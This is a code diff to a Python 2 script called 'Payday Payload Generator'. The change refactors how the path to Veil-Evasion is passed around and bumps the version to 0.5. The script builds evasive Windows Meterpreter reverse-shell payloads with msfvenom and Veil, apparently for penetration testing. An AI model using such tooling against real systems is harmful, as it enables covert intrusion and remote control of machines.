@@ -62,11 +62,10 @@ def msf_payloads(ip, output_dir):
 		print "[!] Generated : " + yellowtxt(handler) + "\n\n"
 
 
-def veil_payloads(ip, output_dir, move_payloads):
+def veil_payloads(ip, output_dir, move_payloads, veil_script):
 	""" Takes local IP address as LHOST parm and builds Veil payloads"""
 	# Veil doesn't have a custom output directory option and the default path gets pulled from the config file
-	# hacky approach :: copy each generated payload and hander in to the custom output directory if it is supplied
-	veil_script = "/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py "
+	# hacky approach :: copy each generated payload and handler in to the custom output directory if it is supplied
 	# start empty list to hold
 	payloads = []
 	# appends payloads with nested 3 value list for dynamic parm calling
@@ -82,7 +81,7 @@ def veil_payloads(ip, output_dir, move_payloads):
 		lport = str(parms[1])
 		output = parms[2]
 		command = ("-p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output + " --overwrite")
-		os.system(veil_script + command)
+		os.system(veil_script + " " + command)
 		time.sleep(2)
 		# if using a custom output directory, veil doesn't have an option to specify the base directory as it gets this from the conf file
 		# payload generated above has unique 'base' name - access the list and check the boolean flag that is pushed in
@@ -142,10 +141,10 @@ def php_payloads(ip, output_dir):
 
 
 
-def clean(payload_path):
+def clean(payload_path, veil_script):
 	""" Cleans out directory """
 	# start with default Veil direcory - gets rid of hashes etc
-	os.system("/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py --clean")
+	os.system(veil_script + " --clean")
 	os.system("clear")
  	print yellowtxt("[!] Now cleaning default output directory\n")
 	# clean out generated payloads in default or custom directory
@@ -208,9 +207,10 @@ def bluetxt(text2colour):
 
 def Main():
 	# program version
-	version = 0.4
+	version = 0.5
 	banner()
 	default_path = '/root/payloads/windows'
+	veil_script = '/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py'
 
 	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil. Outputs to '/root/payloads/windows/' by default.")
 	parser.add_argument("--veil", action="store_true", help='Veil Payloads')
@@ -220,8 +220,6 @@ def Main():
 	parser.add_argument("--output", help="Specify new output directory.")
 	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')
 	
-	
-
 
 	# counts the supplied number of arguments and prints help if they are missing
 	if len(sys.argv)==1:
@@ -259,7 +257,7 @@ def Main():
 			print "[!] IP address required with this payload option :: --veil --ip <Address>"
 		else:
 			print yellowtxt("[!] Encoding Veil payloads")
-			veil_payloads(ip ,output_dir, move_payloads)
+			veil_payloads(ip ,output_dir, move_payloads, veil_script)
 
 
 	if args.msf:
@@ -283,12 +281,12 @@ def Main():
 		if args.output:
 			output_dir = get_payload_output(output)
 			print redtxt("Cleaning out Payload and Handler File directories in : ") + yellowtxt(output_dir)
-			clean(output_dir)
+			clean(output_dir, veil_script)
 		else:
 			payload_paths = ["/root/payloads/windows/","/root/payloads/windows/handlers/"]
 			print redtxt("Cleaning out Payload and Handler File directories")
 			for payload_path in payload_paths:
-				clean(payload_path)
+				clean(payload_path, veil_script)
 
 
 if __name__ == "__main__":
